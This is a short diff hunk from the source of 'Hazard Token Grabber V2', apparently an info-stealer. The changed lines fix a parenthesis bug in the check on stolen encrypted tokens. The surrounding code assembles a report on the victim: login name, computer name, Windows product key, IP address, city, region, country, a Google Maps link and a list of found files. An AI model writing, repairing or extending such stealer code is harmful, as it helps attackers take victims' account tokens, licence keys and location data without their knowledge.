@@ -426,7 +426,7 @@ class Hazard_Token_Grabber_V2:
         self.fileCount = f"{len(files)} Files Found: "
         description = f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
 
-        if len(self.encrypted_tokens > 0):
+        if len(self.encrypted_tokens) > 0:
             x = 1
             description += "\n```Encrypted Tokens: "
             for i in self.encrypted_tokens:
